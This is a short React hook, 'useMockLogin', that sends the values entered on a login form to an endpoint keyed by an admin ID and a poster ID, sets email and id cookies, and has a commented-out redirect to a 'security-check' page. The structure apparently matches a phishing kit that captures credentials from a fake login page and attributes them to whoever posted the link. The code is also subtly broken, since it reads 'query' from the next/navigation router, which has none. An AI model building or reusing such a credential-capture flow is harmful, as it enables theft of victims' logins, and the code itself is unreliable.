
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config/config";
import { useRouter } from "next/navigation";

function useMockLogin() {
  const {
    push,
    query: { adminId, posterId },
  } = useRouter();

  const login = async (values) => {
    // console.log(values);
    // return;

    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);

      // push("/security-check");

    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { login };
}

export default useMockLogin;